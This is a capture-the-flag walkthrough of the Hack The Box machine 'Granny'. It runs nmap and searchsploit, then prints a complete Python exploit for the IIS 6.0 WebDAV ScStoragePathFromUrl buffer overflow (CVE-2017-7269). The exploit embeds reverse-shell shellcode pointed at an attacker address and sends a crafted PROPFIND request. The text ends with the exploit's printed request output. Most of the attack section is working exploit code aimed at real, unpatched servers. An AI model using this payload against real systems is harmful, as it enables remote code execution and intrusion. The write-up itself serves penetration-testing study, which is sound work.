# Granny

```
kali@kali:~/htb/Granny$ sudo nmap -sV -sC 10.129.85.227
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 08:58 EST
Nmap scan report for 10.129.85.227
Host is up (0.027s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Fri, 22 Jan 2021 14:12:00 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```

Ok, so we got a Microsoft-IIS 6.0 server. I tried checking the home page, and it’s under construction. So I check for exploits with searchsploit:


```
kali@kali:~/htb/Granny$ searchsploit IIS 6.0
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                       | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                  | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                           | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                 | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                               | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                            | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                            | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                        | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                          | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                               | windows/remote/19033.txt
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I decided to try out the WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow first.

There is a buffer overflow in the ScStoragePathFromUrl function in the WebDAV service. And this allows us to execute our own code.

The demo script only opens calculator.exe, which does not really help our cause. 

I found a modified script here: https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell 

So I further modified it a bit to this: 

```
import sys
import struct
import socket  

shellcode='\x55\x8B\xEC\x81\xEC\xDC\x05\x00\x00\x53\x56\x57\x8B\x45\x08\x8B'+\
'\x40\x78\x89\x85\xE4\xFA\xFF\xFF\x8B\x45\x08\x8B\x40\x70\x89\x45'+\
'\xFC\xC7\x85\xC8\xFC\xFF\xFF\x77\x73\x32\x5F\xC7\x85\xCC\xFC\xFF'+\
'\xFF\x33\x32\x2E\x64\xC7\x85\xD0\xFC\xFF\xFF\x6C\x6C\x00\x00\xC7'+\
'\x85\xD8\xFA\xFF\xFF\x57\x53\x41\x53\xC7\x85\xDC\xFA\xFF\xFF\x74'+\
'\x61\x72\x74\xC7\x85\xE0\xFA\xFF\xFF\x75\x70\x00\x00\xC7\x85\x58'+\
'\xFA\xFF\xFF\x57\x53\x41\x53\xC7\x85\x5C\xFA\xFF\xFF\x6F\x63\x6B'+\
'\x65\xC7\x85\x60\xFA\xFF\xFF\x74\x41\x00\x00\xC7\x85\xE8\xFC\xFF'+\
'\xFF\x57\x53\x41\x43\xC7\x85\xEC\xFC\xFF\xFF\x6F\x6E\x6E\x65\xC7'+\
'\x85\xF0\xFC\xFF\xFF\x63\x74\x00\x00\xC7\x85\xA8\xFA\xFF\xFF\x69'+\
'\x6E\x65\x74\xC7\x85\xAC\xFA\xFF\xFF\x5F\x61\x64\x64\xC7\x85\xB0'+\
'\xFA\xFF\xFF\x72\x00\x00\x00\xC7\x85\x14\xFD\xFF\xFF\x68\x74\x6F'+\
'\x6E\xC7\x85\x18\xFD\xFF\xFF\x73\x00\x00\x00\xC7\x85\xF4\xFC\xFF'+\
'\xFF\x43\x3A\x5C\x57\xC7\x85\xF8\xFC\xFF\xFF\x69\x6E\x64\x6F\xC7'+\
'\x85\xFC\xFC\xFF\xFF\x77\x73\x5C\x73\xC7\x85\x00\xFD\xFF\xFF\x79'+\
'\x73\x74\x65\xC7\x85\x04\xFD\xFF\xFF\x6D\x33\x32\x5C\xC7\x85\x08'+\
'\xFD\xFF\xFF\x63\x6D\x64\x2E\xC7\x85\x0C\xFD\xFF\xFF\x65\x78\x65'+\
'\x00\xC7\x85\x18\xFB\xFF\xFF\x43\x3A\x5C\x57\xC7\x85\x1C\xFB\xFF'+\
'\xFF\x69\x6E\x64\x6F\xC7\x85\x20\xFB\xFF\xFF\x77\x73\x5C\x73\xC7'+\
'\x85\x24\xFB\xFF\xFF\x79\x73\x74\x65\xC7\x85\x28\xFB\xFF\xFF\x6D'+\
'\x33\x32\x5C\xC7\x85\x2C\xFB\xFF\xFF\x63\x61\x6C\x63\xC7\x85\x30'+\
'\xFB\xFF\xFF\x2E\x65\x78\x65\x83\xA5\x34\xFB\xFF\xFF\x00\xC7\x85'+\
'\xE8\xFA\xFF\xFF\x43\x3A\x5C\x57\xC7\x85\xEC\xFA\xFF\xFF\x49\x4E'+\
'\x44\x4F\xC7\x85\xF0\xFA\xFF\xFF\x57\x53\x5C\x49\xC7\x85\xF4\xFA'+\
'\xFF\xFF\x49\x53\x20\x54\xC7\x85\xF8\xFA\xFF\xFF\x65\x6D\x70\x6F'+\
'\xC7\x85\xFC\xFA\xFF\xFF\x72\x61\x72\x79\xC7\x85\x00\xFB\xFF\xFF'+\
'\x20\x43\x6F\x6D\xC7\x85\x04\xFB\xFF\xFF\x70\x72\x65\x73\xC7\x85'+\
'\x08\xFB\xFF\xFF\x73\x65\x64\x20\xC7\x85\x0C\xFB\xFF\xFF\x46\x69'+\
'\x6C\x65\xC7\x85\x10\xFB\xFF\xFF\x73\x5C\x63\x2E\xC7\x85\x14\xFB'+\
'\xFF\xFF\x65\x78\x65\x00\xC7\x85\xD0\xFA\xFF\xFF'+struct.pack('i',1337)+\
'\xE9\x3E\x04\x00\x00\x5F\x89\xBD\xB4\xFA\xFF\xFF\xE8\x4C\x04\x00'+\
'\x00\x89\x85\x24\xFA\xFF\xFF\x68\x53\xC0\x49\x9C\xFF\xB5\x24\xFA'+\
'\xFF\xFF\xE8\x5D\x04\x00\x00\x59\x59\x89\x85\x28\xFA\xFF\xFF\x68'+\
'\x5A\xC1\xCB\xC2\xFF\xB5\x24\xFA\xFF\xFF\xE8\x45\x04\x00\x00\x59'+\
'\x59\x89\x85\x2C\xFA\xFF\xFF\x68\x1C\xC9\x05\xBA\xFF\xB5\x24\xFA'+\
'\xFF\xFF\xE8\x2D\x04\x00\x00\x59\x59\x89\x85\x30\xFA\xFF\xFF\x68'+\
'\x54\x34\x4F\xA2\xFF\xB5\x24\xFA\xFF\xFF\xE8\x15\x04\x00\x00\x59'+\
'\x59\x89\x85\x34\xFA\xFF\xFF\x68\x12\x75\x1D\x45\xFF\xB5\x24\xFA'+\
'\xFF\xFF\xE8\xFD\x03\x00\x00\x59\x59\x89\x85\x38\xFA\xFF\xFF\x68'+\
'\xE9\x65\x73\x1B\xFF\xB5\x24\xFA\xFF\xFF\xE8\xE5\x03\x00\x00\x59'+\
'\x59\x89\x85\x3C\xFA\xFF\xFF\x68\x3A\xFD\xFB\x1E\xFF\xB5\x24\xFA'+\
'\xFF\xFF\xE8\xCD\x03\x00\x00\x59\x59\x89\x85\x40\xFA\xFF\xFF\x68'+\
'\xBD\x50\xD7\x2D\xFF\xB5\x24\xFA\xFF\xFF\xE8\xB5\x03\x00\x00\x59'+\
'\x59\x89\x85\x44\xFA\xFF\xFF\x68\xEF\x60\x08\xE7\xFF\xB5\x24\xFA'+\
'\xFF\xFF\xE8\x9D\x03\x00\x00\x59\x59\x89\x85\x48\xFA\xFF\xFF\x68'+\
'\x83\x94\x7B\x10\xFF\xB5\x24\xFA\xFF\xFF\xE8\x85\x03\x00\x00\x59'+\
'\x59\x89\x85\x4C\xFA\xFF\xFF\x68\x49\x17\x55\xC0\xFF\xB5\x24\xFA'+\
'\xFF\xFF\xE8\x6D\x03\x00\x00\x59\x59\x89\x85\x50\xFA\xFF\xFF\x68'+\
'\xD9\xE5\x1A\x06\xFF\xB5\x24\xFA\xFF\xFF\xE8\x55\x03\x00\x00\x59'+\
'\x59\x89\x85\x54\xFA\xFF\xFF\x8D\x85\xC8\xFC\xFF\xFF\x50\xFF\x95'+\
'\x28\xFA\xFF\xFF\x89\x85\x1C\xFD\xFF\xFF\x83\xBD\x1C\xFD\xFF\xFF'+\
'\x00\x0F\x84\x39\x01\x00\x00\x83\xA5\xD4\xFA\xFF\xFF\x00\xEB\x0D'+\
'\x8B\x85\xD4\xFA\xFF\xFF\x40\x89\x85\xD4\xFA\xFF\xFF\x83\xBD\xD4'+\
'\xFA\xFF\xFF\x44\x73\x10\x8B\x85\xD4\xFA\xFF\xFF\x80\xA4\x05\x64'+\
'\xFA\xFF\xFF\x00\xEB\xDA\x83\xA5\xD4\xFA\xFF\xFF\x00\xEB\x0D\x8B'+\
'\x85\xD4\xFA\xFF\xFF\x40\x89\x85\xD4\xFA\xFF\xFF\x83\xBD\xD4\xFA'+\
'\xFF\xFF\x10\x73\x10\x8B\x85\xD4\xFA\xFF\xFF\x80\xA4\x05\x20\xFD'+\
'\xFF\xFF\x00\xEB\xDA\x8D\x85\x20\xFD\xFF\xFF\x50\x8D\x85\x64\xFA'+\
'\xFF\xFF\x50\x6A\x00\x6A\x00\x6A\x04\x6A\x00\x6A\x00\x6A\x00\x6A'+\
'\x00\x8D\x85\x18\xFB\xFF\xFF\x50\xFF\x95\x34\xFA\xFF\xFF\xFF\xB5'+\
'\x24\xFD\xFF\xFF\xFF\x95\x3C\xFA\xFF\xFF\x68\xE8\x03\x00\x00\xFF'+\
'\x95\x54\xFA\xFF\xFF\xFF\xB5\x24\xFD\xFF\xFF\xFF\x95\x40\xFA\xFF'+\
'\xFF\xC7\x85\x30\xFD\xFF\xFF\x01\x00\x01\x00\x8D\x85\x30\xFD\xFF'+\
'\xFF\x50\xFF\xB5\x24\xFD\xFF\xFF\xFF\x95\x44\xFA\xFF\xFF\x6A\x40'+\
'\x68\x00\x10\x00\x00\xFF\x75\xFC\x6A\x00\xFF\xB5\x20\xFD\xFF\xFF'+\
'\xFF\x95\x48\xFA\xFF\xFF\x89\x85\x10\xFD\xFF\xFF\x6A\x00\xFF\x75'+\
'\xFC\xFF\xB5\xE4\xFA\xFF\xFF\xFF\xB5\x10\xFD\xFF\xFF\xFF\xB5\x20'+\
'\xFD\xFF\xFF\xFF\x95\x4C\xFA\xFF\xFF\x8B\x85\x10\xFD\xFF\xFF\x89'+\
'\x85\xE8\xFD\xFF\xFF\xC7\x85\x30\xFD\xFF\xFF\x01\x00\x01\x00\x8D'+\
'\x85\x30\xFD\xFF\xFF\x50\xFF\xB5\x24\xFD\xFF\xFF\xFF\x95\x50\xFA'+\
'\xFF\xFF\xFF\xB5\x24\xFD\xFF\xFF\xFF\x95\x3C\xFA\xFF\xFF\xEB\x1E'+\
'\x6A\x00\x8D\x85\xE8\xFA\xFF\xFF\x50\x8D\x85\xF4\xFC\xFF\xFF\x50'+\
'\xFF\x95\x30\xFA\xFF\xFF\x6A\x01\xFF\x95\x38\xFA\xFF\xFF\x68\x70'+\
'\x17\x00\x00\xFF\x95\x54\xFA\xFF\xFF\x8D\x85\xD8\xFA\xFF\xFF\x50'+\
'\xFF\xB5\x1C\xFD\xFF\xFF\xFF\x95\x2C\xFA\xFF\xFF\x89\x85\xBC\xFA'+\
'\xFF\xFF\x8D\x85\x58\xFA\xFF\xFF\x50\xFF\xB5\x1C\xFD\xFF\xFF\xFF'+\
'\x95\x2C\xFA\xFF\xFF\x89\x85\xC0\xFA\xFF\xFF\x8D\x85\xE8\xFC\xFF'+\
'\xFF\x50\xFF\xB5\x1C\xFD\xFF\xFF\xFF\x95\x2C\xFA\xFF\xFF\x89\x85'+\
'\xC4\xFA\xFF\xFF\x8D\x85\xA8\xFA\xFF\xFF\x50\xFF\xB5\x1C\xFD\xFF'+\
'\xFF\xFF\x95\x2C\xFA\xFF\xFF\x89\x85\xC8\xFA\xFF\xFF\x8D\x85\x14'+\
'\xFD\xFF\xFF\x50\xFF\xB5\x1C\xFD\xFF\xFF\xFF\x95\x2C\xFA\xFF\xFF'+\
'\x89\x85\xCC\xFA\xFF\xFF\x8D\x85\x38\xFB\xFF\xFF\x50\x68\x02\x02'+\
'\x00\x00\xFF\x95\xBC\xFA\xFF\xFF\x6A\x00\x6A\x00\x6A\x00\x6A\x06'+\
'\x6A\x01\x6A\x02\xFF\x95\xC0\xFA\xFF\xFF\x89\x85\xD4\xFC\xFF\xFF'+\
'\x66\xC7\x85\xD8\xFC\xFF\xFF\x02\x00\xFF\xB5\xD0\xFA\xFF\xFF\xFF'+\
'\x95\xCC\xFA\xFF\xFF\x66\x89\x85\xDA\xFC\xFF\xFF\xFF\xB5\xB4\xFA'+\
'\xFF\xFF\xFF\x95\xC8\xFA\xFF\xFF\x89\x85\xDC\xFC\xFF\xFF\x6A\x00'+\
'\x6A\x00\x6A\x00\x6A\x00\x6A\x10\x8D\x85\xD8\xFC\xFF\xFF\x50\xFF'+\
'\xB5\xD4\xFC\xFF\xFF\xFF\x95\xC4\xFA\xFF\xFF\x83\xA5\xD4\xFA\xFF'+\
'\xFF\x00\xEB\x0D\x8B\x85\xD4\xFA\xFF\xFF\x40\x89\x85\xD4\xFA\xFF'+\
'\xFF\x83\xBD\xD4\xFA\xFF\xFF\x44\x73\x10\x8B\x85\xD4\xFA\xFF\xFF'+\
'\x80\xA4\x05\x64\xFA\xFF\xFF\x00\xEB\xDA\xC7\x85\x64\xFA\xFF\xFF'+\
'\x44\x00\x00\x00\xC7\x85\x90\xFA\xFF\xFF\x01\x01\x00\x00\x8B\x85'+\
'\xD4\xFC\xFF\xFF\x89\x85\xA4\xFA\xFF\xFF\x8B\x85\xA4\xFA\xFF\xFF'+\
'\x89\x85\xA0\xFA\xFF\xFF\x8B\x85\xA0\xFA\xFF\xFF\x89\x85\x9C\xFA'+\
'\xFF\xFF\x8D\x85\x20\xFD\xFF\xFF\x50\x8D\x85\x64\xFA\xFF\xFF\x50'+\
'\x6A\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x00\x6A\x00\x8D\x85\xE8\xFA'+\
'\xFF\xFF\x50\x6A\x00\xFF\x95\x34\xFA\xFF\xFF\x6A\x01\xFF\x95\x38'+\
'\xFA\xFF\xFF\xE8\xBD\xFB\xFF\xFF'+struct.pack('16s',"10.10.14.21")+'\x5F\x5E\x5B\xC9\xC3\x64\xA1\x18'+\
'\x00\x00\x00\x8B\x40\x30\x33\xC9\x8B\x40\x0C\x8B\x40\x1C\x8B\x00'+\
'\x8B\x50\x20\x66\x83\x7A\x10\x2E\x74\x06\x41\x83\xF9\x02\x7C\xEE'+\
'\x8B\x40\x08\xC3\x55\x8B\xEC\x53\x56\x57\x8B\x7D\x08\x83\x65\x08'+\
'\x00\x8B\x47\x3C\x8B\x44\x38\x78\x03\xC7\x8B\x70\x20\x03\xF7\x83'+\
'\x78\x18\x00\x76\x2A\x8B\x0E\x03\xCF\x33\xDB\x8A\x11\x84\xD2\x74'+\
'\x0B\x6B\xDB\x21\x0F\xBE\xD2\x03\xDA\x41\xEB\xEF\x3B\x5D\x0C\x74'+\
'\x15\x83\xC6\x04\xFF\x45\x08\x8B\x4D\x08\x3B\x48\x18\x72\xD6\x33'+\
'\xC0\x5F\x5E\x5B\x5D\xC3\x8B\x48\x24\x8B\x55\x08\x8B\x40\x1C\x8D'+\
'\x0C\x51\x0F\xB7\x0C\x39\x8D\x04\x88\x8B\x04\x38\x03\xC7\xEB\xE1'
shellcodelen = len(shellcode)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(("10.129.85.227",80))
pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: %d\r\n'%shellcodelen
pay+='If: <http://localhost/aaaaaaa'
pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
pay+='>'
pay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'
pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'
smallsc='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A'
pay+=smallsc
pay+='>\r\n\r\n'
print pay
sock.send(pay)
sock.send(shellcode)
data = sock.recv(80960)  
print data 
sock.close
```

I did try msfvenom reverse shells instead of the one in the script, to shorten it down. But my nc listener would be stuck after the connection was received. 

```
kali@kali:~/htb/Granny$ python exploit.py
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa￦ﾽﾨ￧ﾡﾣ￧ﾝﾡ￧ﾄﾳ￦ﾤﾶ￤ﾝﾲ￧ﾨﾹ￤ﾭﾷ￤ﾽﾰ￧ﾕﾓ￧ﾩﾏ￤ﾡﾨ￥ﾙﾣ￦ﾵﾔ￦ﾡﾅ￣ﾥﾓ￥ﾁﾬ￥ﾕﾧ￦ﾝﾣ￣ﾍﾤ￤ﾘﾰ￧ﾡﾅ￦ﾥﾒ￥ﾐﾱ￤ﾱﾘ￦ﾩﾑ￧ﾉﾁ￤ﾈﾱ￧ﾀﾵ￥ﾡﾐ￣ﾙﾤ￦ﾱﾇ￣ﾔﾹ￥ﾑﾪ￥ﾀﾴ￥ﾑﾃ￧ﾝﾒ￥ﾁﾡ￣ﾈﾲ￦ﾵﾋ￦ﾰﾴ￣ﾉﾇ￦ﾉﾁ￣ﾝﾍ￥ﾅﾡ￥ﾡﾢ￤ﾝﾳ￥ﾉﾐ￣ﾙﾰ￧ﾕﾄ￦ﾡﾪ￣ﾍﾴ￤ﾹﾊ￧ﾡﾫ￤ﾥﾶ￤ﾹﾳ￤ﾱﾪ￥ﾝﾺ￦ﾽﾱ￥ﾡﾊ￣ﾈﾰ￣ﾝﾮ￤ﾭﾉ￥ﾉﾍ￤ﾡﾣ￦ﾽﾌ￧ﾕﾖ￧ﾕﾵ￦ﾙﾯ￧ﾙﾨ￤ﾑﾍ￥ﾁﾰ￧ﾨﾶ￦ﾉﾋ￦ﾕﾗ￧ﾕﾐ￦ﾩﾲ￧ﾩﾫ￧ﾝﾢ￧ﾙﾘ￦ﾉﾈ￦ﾔﾱ￣ﾁﾔ￦ﾱﾹ￥ﾁﾊ￥ﾑﾢ￥ﾀﾳ￣ﾕﾷ￦ﾩﾷ￤ﾅﾄ￣ﾌﾴ￦ﾑﾶ￤ﾵﾆ￥ﾙﾔ￤ﾝﾬ￦ﾕﾃ￧ﾘﾲ￧ﾉﾸ￥ﾝﾩ￤ﾌﾸ￦ﾉﾲ￥ﾨﾰ￥ﾤﾸ￥ﾑﾈ￈ﾂ￈ﾂ￡ﾋﾀ￦ﾠﾃ￦ﾱﾄ￥ﾉﾖ￤ﾬﾷ￦ﾱﾭ￤ﾽﾘ￥ﾡﾚ￧ﾥﾐ￤ﾥﾪ￥ﾡﾏ￤ﾩﾒ￤ﾅﾐ￦ﾙﾍ￡ﾏﾀ￦ﾠﾃ￤ﾠﾴ￦ﾔﾱ￦ﾽﾃ￦ﾹﾦ￧ﾑﾁ￤ﾍﾬ￡ﾏﾀ￦ﾠﾃ￥ﾍﾃ￦ﾩﾁ￧ﾁﾒ￣ﾌﾰ￥ﾡﾦ￤ﾉﾌ￧ﾁﾋ￦ﾍﾆ￥ﾅﾳ￧ﾥﾁ￧ﾩﾐ￤ﾩﾬ> (Not <locktoken:write1>) 